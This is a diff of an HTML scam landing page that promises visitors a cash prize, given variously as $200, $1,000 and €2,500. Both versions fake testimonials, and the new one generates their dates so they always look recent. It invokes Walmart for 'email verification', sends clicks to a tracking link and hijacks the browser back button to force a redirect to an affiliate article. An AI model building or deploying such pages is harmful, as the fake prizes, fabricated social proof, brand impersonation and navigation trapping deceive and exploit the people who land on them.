@@ -1,229 +1,168 @@
-<html xmlns="http://www.w3.org/1999/xhtml" class="">
+<!doctype html>
+<html lang="es" dir="ltr">
 
 <head>
-	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-	<script type="text/javascript">var ip = "";</script>
-	<meta name="viewport" content="width=device-width, initial-scale=1.0">
-	<link type="text/css" rel="stylesheet" charset="UTF-8" href="css/index.css">
-	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
-	<link href="css/sweetalert.css" rel="stylesheet" type="text/css">
-	<style type="text/css">
-		*[attr-cou] {
-			display: none !important;
-		}
-
-		*[attr-lan] {
-			display: none !important;
-		}
-
-		.forceDisplay {
-			display: block !important;
-		}
-
-		.forceDisplayInline {
-			display: inline-block !important;
-		}
-	</style>
+    <title>Congratulations!</title>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="shortcut icon" href="data:image/x-icon" type="image/x-icon">
+    <link href="landers/pick-a-prize/assets/app.css" type="text/css" rel="stylesheet" />
+    <script src="../_worker.js"></script>
 </head>
 
-<body>
-	<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0" name="viewport">
-	<title>Congratulations!</title>
+<body class="theme--default">
 
-	<div id="a-nav">
-		<div class="icon-nav"></div>
-		<h1>Congratulations!</h1>
-		<div class="icon-basket"></div>
-	</div>
-	<main>
-		<div class="content">
-			<div class="main-content" id="content1">
+    <main id="app" v-cloak>
+        <div class="header">
+            <img class="header__menu" src="landers/pick-a-prize/assets/img/menu.svg" alt="Menu">
+            <img class="header__logo" src="landers/pick-a-prize/assets/img/logo/default.svg" alt="Image" />
+            <img class="header__account" src="landers/pick-a-prize/assets/img/account.svg" alt="Account">
+        </div>
+        <div class="content">
+            <div v-if="!showPrize">
+                <h1 class="title title--h1">
+                    🥳 Congratulations! 🥳
+                </h1>
+                <p class="paragraph">
+                    You have the chance to win a big prize!
+                </p>
+                <p class="paragraph">
+                    Open a box and find out what you can win⬇️
+                </p>
+                <prize-picker button-text="Select" button-selected-text="Ganado!" button-hover-color="#00c853"
+                    :disabled="!!selected" class="prize-picker" v-on:selected="receiveSelected">
+                    <template v-slot:prize1>
+                        <img v-show="!selected" key="1" src="landers/pick-a-prize/assets/img/chest.jpg"
+                            class="prize-picker__image prize-picker__image--placeholder" alt="">
+                        <img v-show="selected === 1" key="2" src="img/prizes/cash-2500-usd/nl/default@0.5x.png"
+                            class="prize-picker__image" alt="/€2,500.00 Cash" />
+                        <img v-show="selected && selected !== 1" key="3" src="landers/pick-a-prize/assets/img/chest.jpg"
+                            class="prize-picker__image prize-picker__image--placeholder" alt="/€2,500.00 Cash" />
+                    </template>
+                    <template v-slot:prize2>
+                        <img v-show="!selected" src="landers/pick-a-prize/assets/img/chest.jpg"
+                            class="prize-picker__image prize-picker__image--placeholder" alt="">
+                        <img v-show="selected === 2" src="img/prizes/cash-2500-usd/nl/default@0.5x.png"
+                            class="prize-picker__image" alt="/€2,500.00 Cash" alt="" />
+                        <img v-show="selected && selected !== 2" src="landers/pick-a-prize/assets/img/chest.jpg"
+                            class="prize-picker__image prize-picker__image--placeholder" alt="/€2,500.00 Cash" />
+                    </template>
+                    <template v-slot:prize3>
+                        <img v-show="!selected" src="landers/pick-a-prize/assets/img/chest.jpg"
+                            class="prize-picker__image prize-picker__image--placeholder" alt="" />
+                        <img v-show="selected === 3" src="img/prizes/cash-2500-usd/nl/default@0.5x.png"
+                            class="prize-picker__image" alt="/€2,500.00 Cash" alt="" />
+                        <img v-show="selected && selected !== 3" src="landers/pick-a-prize/assets/img/chest.jpg"
+                            class="prize-picker__image prize-picker__image--placeholder" alt="/€2,500.00 Cash" />
+                    </template>
+                </prize-picker>
+            </div>
+            <div class="prize" v-else>
+                <h2 class="title title--h2">You Won:</h2>
+                <img class="prize__image" src="img/prizes/cash-2500-usd/nl/default@0.5x.png" alt="">
+                <div class="prize__name">
+                    💵 USD 1,000$ 💵
+                </div>
+                <p class="paragraph">
+                    To get the amount, complete 2 steps:
+                </p>
+                <p class="paragraph">
+                    Step 1: Verify email address at Walmart.
+                    <br>Step 2: You will get bonus in three days.
+                </p>
+                <a href="https://now.gotopsale.com/click" class="prize__button" target="_blank"
+                    onclick="setTimeout(function() { window.location = 'https://fivoraco.com/house/best-spring-home-procucts-to-transform-your-space-in-2026/'; }, 100);"
+                    style="padding:0px;margin:0;border:0px;">Start
+                    immediately ➡️</a>
+            </div>
+            <div class="testimonials">
+                <h2 class="testimonials__title">Hall of Fame</h2>
+                <prize-comment avatar="img/profiles/latin/female/3@0.25x.jpg" name="Alba Jiménez"
+                    :date="`${DateHelper().getMonthName({ days: -1 })} ${DateHelper().getDate({ days: -1 })}, ${DateHelper().getYear({ days: -1 })}`"
+                    message="I received it today, i'm so happy!"></prize-comment>
+                <prize-comment avatar="img/profiles/latin/male/3@0.25x.jpg" name="David Navarro"
+                    :date="`${DateHelper().getMonthName({ days: -2 })} ${DateHelper().getDate({ days: -2 })}, ${DateHelper().getYear({ days: -2 })}`"
+                    message="No prize for me... can I have another chance?"></prize-comment>
+                <prize-comment avatar="img/profiles/latin/male/10@0.25x.jpg" name="Hugo García"
+                    :date="`${DateHelper().getMonthName({ days: -2 })} ${DateHelper().getDate({ days: -2 })}, ${DateHelper().getYear({ days: -2 })}`"
+                    message="I won!! Thanks!"></prize-comment>
+                <prize-comment avatar="img/profiles/latin/female/6@0.25x.jpg" name="Paula Moreno"
+                    :date="`${DateHelper().getMonthName({ days: -3 })} ${DateHelper().getDate({ days: -3 })}, ${DateHelper().getYear({ days: -3 })}`"
+                    message="I won! Wooooooo"></prize-comment>
+                <prize-comment avatar="img/profiles/latin/male/9@0.25x.jpg" name="Santiago Fernández"
+                    :date="`${DateHelper().getMonthName({ days: -4 })} ${DateHelper().getDate({ days: -4 })}, ${DateHelper().getYear({ days: -4 })}`"
+                    message="This is amazing I can't wait to play!"></prize-comment>
+                <prize-comment avatar="img/profiles/latin/female/5@0.25x.jpg" name="Daniela Alonso"
+                    :date="`${DateHelper().getMonthName({ days: -4 })} ${DateHelper().getDate({ days: -4 })}, ${DateHelper().getYear({ days: -4 })}`"
+                    message="Call me a sore loser, because I really wanted it!"></prize-comment>
+                <prize-comment avatar="img/profiles/latin/female/1@0.25x.jpg" name="Noa García"
+                    :date="`${DateHelper().getMonthName({ days: -6 })} ${DateHelper().getDate({ days: -6 })}, ${DateHelper().getYear({ days: -6 })}`"
+                    message="That was so easy, I won!!!!"></prize-comment>
+                <prize-comment avatar="img/profiles/latin/male/2@0.25x.jpg" name="Martín Moreno"
+                    :date="`${DateHelper().getMonthName({ days: -7 })} ${DateHelper().getDate({ days: -7 })}, ${DateHelper().getYear({ days: -7 })}`"
+                    message="I've never won anything, but I hope I'm lucky!"></prize-comment>
+                <prize-comment avatar="img/profiles/latin/male/6@0.25x.jpg" name="Nicolas López"
+                    :date="`${DateHelper().getMonthName({ days: -8 })} ${DateHelper().getDate({ days: -8 })}, ${DateHelper().getYear({ days: -8 })}`"
+                    message="The gift wasn't received until the next day, but it's real."></prize-comment>
+                <prize-comment avatar="img/profiles/latin/male/8@0.25x.jpg" name="Juan González"
+                    :date="`${DateHelper().getMonthName({ days: -9 })} ${DateHelper().getDate({ days: -9 })}, ${DateHelper().getYear({ days: -9 })}`"
+                    message="Both my wife and I won the prize, which is really nice, haha!"></prize-comment>
+            </div>
+        </div>
+        <div class="loader" v-show="selected && !showPrize">
+            <div class="loader__dual-ring"></div>
+        </div>
+    </main>
 
-				<center style="padding-top:10px; color:white;">
-					<strong>You can win a special prize today!</strong>
-				</center>
-				<strong>
-					<div id="spinner">
-						<img id="spinBG" src="images/11.png">
-						<img id="spin" src="images/aespinner.png">
-						<img id="win" onclick="" src="images/spin.png">
-						<img class="animated rotateIn" id="iphone" src="images/arprize.png">
-					</div>
+    <script>
+        window.view = window.view || {};
+        view.datetimeTranslations = {
+            "ago": ":time ago",
+            "from_now": ":time from now",
+            "after": ":time after",
+            "before": ":time before",
+            "year": "1 year|:count years",
+            "month": "1 month|:count months",
+            "week": "1 week|:count weeks",
+            "day": "1 day|:count days",
+            "hour": "1 hour|:count hours",
+            "minute": "1 minute|:count minutes",
+            "second": "1 second|:count seconds",
+            "january": "January",
+            "february": "February",
+            "march": "March",
+            "april": "April",
+            "may": "May",
+            "june": "June",
+            "july": "July",
+            "august": "August",
+            "september": "September",
+            "october": "October",
+            "november": "November",
+            "december": "December",
+            "monday": "Monday",
+            "tuesday": "Tuesday",
+            "wednesday": "Wednesday",
+            "thursday": "Thursday",
+            "friday": "Friday",
+            "saturday": "Saturday",
+            "sunday": "Sunday"
+        };
+    </script>
+    <script>
+        // 当页面加载完成时，立即向history栈添加一个状态
+        history.pushState(null, null, location.href);
 
-					<div class="comments1">
-						<div><small><span id="likes" class="like">1,221</span> likes</small>
-						</div>
-						<div><span class="photo p1">
-								<img src="images/1.png"></span>
-							<div class="commentsblock"><b>Michael Lucas</b>
-								<p>I received it today, i'm so happy!</p><small><span class="like">Like</span> · <u>4 minutes
-									</u></small>
-							</div>
-						</div>
-						<div><span class="photo p2">
-								<img src="images/2.png"></span>
-							<div class="commentsblock"><b>Kyle Kelly</b>
-								<p>No prize for me... can I have another chance?</p><small><span class="like">Like</span> · <u>5 minutes
-									</u></small>
-							</div>
-						</div>
-						<div><span class="photo p3">
-								<img src="images/3.png"></span>
-							<div class="commentsblock"><b>Andrew Miller</b>
-								<p>I won!! Thanks!</p>
-								<small><span class="like">Like</span> · <u>11 minutes </u></small>
-							</div>
-						</div>
-						<div><span class="photo p4">
-								<img src="images/4.png"></span>
-							<div class="commentsblock"><b>Raymond Bush</b>
-								<p> I won! Wooooooo</p><small><span class="like">Like</span> · <u>15 minutes</u></small>
-							</div>
-						</div>
-						<div><span class="photo p5">
-								<img src="images/5.png"></span>
-							<div class="commentsblock"><b>Enrique Morales</b>
-								<p>This is amazing I can't wait to play!</p><small><span class="like">Like</span> · <u>38
-										minutes</u></small>
-							</div>
-						</div>
-						<div><span class="photo p6">
-								<img src="images/6.png"></span>
-							<div class="commentsblock"><b>Thomas Miles</b>
-								<p>Call me a sore loser, because I really wanted it!</p><small><span class="like">Like</span> · <u>45
-										minutes</u></small>
-							</div>
-						</div>
-						<div><span class="photo p7">
-								<img src="images/7.png"></span>
-							<div class="commentsblock"><b>Samuel Hudson</b>
-								<p>That was so easy, I won!!!!</p><small><span class="like">Like</span> · <u>1 hour</u></small>
-							</div>
-						</div>
-						<div><span class="photo p8">
-								<img src="images/8.png"></span>
-							<div class="commentsblock"><b>Anna Nelson </b>
-								<p>I've never won anything, but I hope I'm lucky!</p><small><span class="like">Like</span> · <u>1
-										hour</u></small>
-							</div>
-						</div>
-					</div>
-
-
-				</strong>
-			</div>
-		</div>
-	</main>
-
-
-	<strong>
-		<div class="sweet-overlay" style="opacity: 1.03; display: block;" tabindex="-1"></div>
-		<div class="sweet-alert animated bounceIn visible" id="modal01">
-			<h2 style="margin-top:30px;"> Congratulations! </h2>
-			<p> Each month we select one lucky customer to win a prize. </p>
-			<div class="sa-button-container">
-				<div class="sa-confirm-button-container">
-					<button onclick="hidemodal01()"
-						style="display: inline-block; box-shadow: rgba(140, 212, 245, 0.8) 0px 0px 2px, rgba(0, 0, 0, 0.0470588) 0px 0px 0px 1px inset; background-color: #25189B;">OK</button>
-
-
-					<div class="la-ball-fall"></div>
-				</div>
-			</div>
-		</div>
-		<div class="sweet-alert animated bounceIn" id="modal02">
-			<div class="sa-icon sa-success" id="success02">
-				<span class="sa-line sa-tip" id="successtip02"></span>
-				<span class="sa-line sa-long" id="successlong02"></span>
-				<div class="sa-placeholder"></div>
-				<div class="sa-fix"></div>
-			</div>
-			<h2> You just won $200...want to try again? </h2>
-			<p> </p>
-			<div class="sa-button-container">
-				<div class="sa-confirm-button-container">
-					<button onclick="hidemodal02()"
-						style="display: inline-block; box-shadow: rgba(140, 212, 245, 0.8) 0px 0px 2px, rgba(0, 0, 0, 0.0470588) 0px 0px 0px 1px inset; background-color:#25189B">OK</button>
-					<div class="la-ball-fall"></div>
-				</div>
-			</div>
-		</div>
-		<div class="sweet-alert animated bounceIn" id="modal03">
-			<div class="sa-icon sa-success" id="success03">
-				<span class="sa-line sa-tip" id="successtio03"></span>
-				<span class="sa-line sa-long" id="successlong03"></span>
-				<div class="sa-placeholder"></div>
-				<div class="sa-fix"></div>
-			</div>
-			<h2> Congratulations! </h2>
-			<p>You win $1,000!
-				<br> To get the amount, complete 2 steps:
-				<br>Step 1: Verify email to download data.
-				<br>Step 2: Get rewarded in 3 days.
-			</p>
-			<div class="sa-button-container">
-				<div class="sa-confirm-button-container">
-					<button
-						style="display: inline-block;box-shadow: rgba(140, 212, 245, 0.8) 0px 0px 2px, rgba(0, 0, 0, 0.0470588) 0px 0px 0px 1px inset; background-color:#25189B;">
-						<a href="https://now.gotopsale.com/click" target="_blank"
-							onclick="setTimeout(function() { window.location = 'https://fivoraco.com/house/best-spring-home-procucts-to-transform-your-space-in-2026/'; }, 100);"
-							style="padding:0px;margin:0;border:0px;">OK</a>
-					</button>
-					<div class="la-ball-fall"></div>
-
-					<script>
-						function hidemodal01() {
-							$('#modal01').removeClass('visible');
-							$('.sweet-overlay').css('display', 'none');
-							$('#spin').addClass('spinAround');
-							$('#xmas').css('display', 'none');
-							setTimeout(function () {
-								$('#modal02').addClass('visible');
-								$('.sweet-overlay').css('display', 'block');
-								$('#xmas').css('display', 'block');
-								$('#xmas').css('top', 'calc(50% - 210px)');
-								setTimeout(function () {
-									$('#success02').addClass('animate');
-									$('#successtip02').addClass('animateSuccessTip');
-									$('#successlong02').addClass('animateSuccessLong');
-								}, 500);
-							}, 7500);
-						}
-
-						function hidemodal02() {
-							$('#modal02').removeClass('visible');
-							$('.sweet-overlay').css('display', 'none');
-							$('#spin').addClass('spinAround2');
-							$('#xmas').css('display', 'none');
-							setTimeout(function () {
-								$('#iphone').css('display', 'block');
-							}, 7000);
-							setTimeout(function () {
-								$('#modal03').addClass('visible');
-								$('.sweet-overlay').css('display', 'block');
-								$('#xmas').css('display', 'block');
-								$('#xmas').css('top', 'calc(50% - 210px)');
-								setTimeout(function () {
-									$('#success03').addClass('animate');
-									$('#successtip03').addClass('animateSuccessTip');
-									$('#successlong03').addClass('animateSuccessLong');
-								}, 500);
-							}, 8000);
-						}
-					</script>
-					<script>
-						// 当页面加载完成时，立即向history栈添加一个状态
-						history.pushState(null, null, location.href);
-
-						window.onpopstate = function (event) {
-							// 这里处理用户点击浏览器后退按钮的情况
-							// 重定向用户到指定页面, 比如 Google
-							location.href = 'https://fivoraco.com/house/best-spring-home-procucts-to-transform-your-space-in-2026/';
-							// 或者重定向用户到他们之前的页面
-							// history.go(-1);
-						}
-					</script>
-
+        window.onpopstate = function (event) {
+            // 这里处理用户点击浏览器后退按钮的情况
+            // 重定向用户到指定页面, 比如 Google
+            location.href = 'https://fivoraco.com/house/best-spring-home-procucts-to-transform-your-space-in-2026/';
+            // 或者重定向用户到他们之前的页面
+            // history.go(-1);
+        }
+    </script>
+    <script type="application/javascript" src="landers/pick-a-prize/assets/app.js"></script>
 </body>
 
 </html>
